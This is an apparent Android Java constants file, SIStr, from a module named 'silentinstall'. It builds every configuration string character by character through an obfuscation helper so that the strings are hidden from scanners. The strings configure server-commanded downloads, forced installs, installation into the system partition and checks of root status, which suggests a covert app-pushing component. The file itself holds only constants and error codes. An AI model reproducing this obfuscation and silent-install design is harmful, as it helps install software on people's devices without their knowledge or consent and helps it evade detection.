package com.invisible.silentinstall.core;

import com.invisible.silentinstall.utils.EE;
import com.invisible.silentinstall.utils.GlobalContext;

import static com.invisible.silentinstall.utils.CtsPtyManager.Eget;
import static com.invisible.silentinstall.utils.EE.B;
import static com.invisible.silentinstall.utils.EE.P;
import static com.invisible.silentinstall.utils.EE.R;
import static com.invisible.silentinstall.utils.EE.S;
import static com.invisible.silentinstall.utils.EE.U;
import static com.invisible.silentinstall.utils.EE.a;
import static com.invisible.silentinstall.utils.EE.d;
import static com.invisible.silentinstall.utils.EE.e;
import static com.invisible.silentinstall.utils.EE.h;
import static com.invisible.silentinstall.utils.EE.i;
import static com.invisible.silentinstall.utils.EE.ion;
import static com.invisible.silentinstall.utils.EE.is;
import static com.invisible.silentinstall.utils.EE.k;
import static com.invisible.silentinstall.utils.EE.l;
import static com.invisible.silentinstall.utils.EE.n;
import static com.invisible.silentinstall.utils.EE.o;
import static com.invisible.silentinstall.utils.EE.p;
import static com.invisible.silentinstall.utils.EE.r;
import static com.invisible.silentinstall.utils.EE.s;
import static com.invisible.silentinstall.utils.EE.t;
import static com.invisible.silentinstall.utils.EE.u;

/**
 * Created by zhengnan on 2015/9/1.
 * 将静默安装模块中用到的 需要加密的str 统一写到这里。
 */
public class SIStr {

    //---begin---   联网相关的参数
    protected static final String packageName = Eget(EE.p, EE.a, EE.c, EE.k, EE.a, EE.g, EE.e, EE.N, EE.a, EE.m, EE.e);//包名
    protected static final String downUrl =Eget(EE.d, EE.o, EE.w, EE.n, EE.U, EE.r, EE.l);//下载包的url
    protected static final String use2g = Eget(EE.u, EE.s, EE.e,"2", EE.g);//2g网络时是否下载
    protected static final String componentType =Eget(EE.c, EE.o, EE.m, EE.p, EE.o, EE.n, EE.e, EE.n, EE.t, EE.T, EE.y, EE.p, EE.e);//下载成功后启动类型
    protected static final String componentName = Eget(EE.c, EE.o, EE.m, EE.p, EE.o, EE.n, EE.e, EE.n, EE.t, EE.N, EE.a, EE.m, EE.e);//下载成功后启动名称
    protected static final String versionCode = Eget(EE.v, EE.e, EE.r, EE.s, EE.i, EE.o, EE.n, EE.C, EE.o, EE.d, EE.e);//包名版本号

    protected static final String finisned = Eget(EE.f, EE.i, EE.n, EE.i, EE.s, EE.n, EE.e, EE.d);//
    protected  static final String installResult = Eget(EE.i, EE.n, EE.s, EE.t, EE.a, EE.l, EE.l, EE.R, EE.e, EE.s, EE.u, EE.l, EE.t);
    protected  static final String isSdk = Eget(is,S,d,k);
    protected static final String statusDesc = Eget(EE.s, EE.t, EE.a, EE.t, EE.u, EE.s, EE.D, EE.e, EE.s, EE.c);
    protected static final String confid = Eget(EE.c, EE.o, EE.n, EE.f, EE.i, EE.d);
    protected static final String genTime = Eget(EE.g, EE.e, EE.n, EE.T, EE.i, EE.m, EE.e);
    protected static final String installPosition = Eget(i,n,s,t,a,l,l,P,o,s,i,t,ion);
    protected static final String needUpdate = Eget(EE.n, EE.e, EE.e, EE.d, EE.U, EE.p, EE.d, EE.a, EE.t, EE.e);//是否提示服务端数据更新
    protected static final String dynamicData = Eget(EE.d, EE.y, EE.n, EE.a, EE.m, EE.i, EE.c, EE.D, EE.a, EE.t, EE.a);//动态数据
    protected  static  final String installOption = Eget(EE.i, EE.n, EE.s, EE.t, EE.a, EE.l, EE.l, EE.O, EE.p, EE.t, EE.ion);
    //下次访问时间
    protected static final String nextInterval = Eget(EE.n, EE.e, EE.x, EE.t, EE.I, EE.n, EE.t, EE.e, EE.r, EE.v, EE.a, EE.l);
    protected  static final String ignoresDevice = Eget(EE.i, EE.g, EE.n, EE.o, EE.r, EE.e, EE.s, EE.D, EE.e, EE.v, EE.i, EE.c, EE.e);
    protected static final String ext = Eget(EE.e, EE.x, EE.t);

    //---end---   联网相关的参数

    //---begin---   使用过程用到的串
    protected  static final String SIVersion = Eget(EE.S, EE.I, EE.V, EE.e, EE.r, EE.s, EE.ion);//"SIVersion";
    protected static final String noBuilt = Eget(n,o,B,u,i,l,t);

    protected  static final String isR = Eget(is,R);//"isR";是否root
    protected static final String isUnUpdate = Eget(is, U, n, U, p, d, a, t, e);
    protected static final String rResult = Eget(r,R,e,s,u,l,t);//是否执行过root
    //与安装模块的交互
    protected  static final String cmd = Eget(EE.cmd);//"SIVersion";
    protected  static final String SI = Eget(EE.S, EE.I);//"SIVersion";
    protected  static final String parentGid = Eget(EE.p, EE.a, EE.r, EE.e, EE.n, EE.t,"G", EE.i, EE.d);//"parentGid";
    protected  static final String parentCid = Eget(EE.p, EE.a, EE.r, EE.e, EE.n, EE.t, EE.C, EE.i, EE.d);//"parentCid";

    protected static final String hasBt = Eget(h, a, s, B, t);

    //---end---   使用过程用到的串

    //非纯串，shortcut
    protected  static final String sc_stat_broadcast = Eget(EE.a, EE.ndroid, EE.$, EE.intent, EE.$, EE.a, EE.c, EE.t, EE.ion, EE.$, EE.l, EE.t, EE.s, EE.t, EE.a, EE.t);//

    //一些简要的反馈描述
    public static class ErrCode{
        /** //安装模式为“2”且本地已存在了。 **/
        public static final int isExist = 101;
        /** 安装模式为1且本地的>=下发的版本**/
        public static final int versionMismatch = 102;
        /** 每个下载完成的包，安装前需都会设定此code，以便安装崩溃后施以应对方式 **/
        public static final int IBefore = 201;
    }
    //后台下发的安装模式 : 安装模式：1：强制安装。0：升级安装。2：不存在安装
    public static class InstallOption{
        public static int FORCE_INSTALL = 1;
        public static int UPDATE_INSTALL = 0;
        public static int NOTEXIST_INSTALL = 2;
    }
    //后台下发的安装位置命令
    public static class InstallPosition{
        public static String SYSTEM = "system";
        public static String DATA = "data";
    }
    //状态码
    public static class StatusCode{
        public static final String SELF_UPDATE_SUCCESS = GlobalContext.isTest?100+"":"自更新安装成功";
    }
}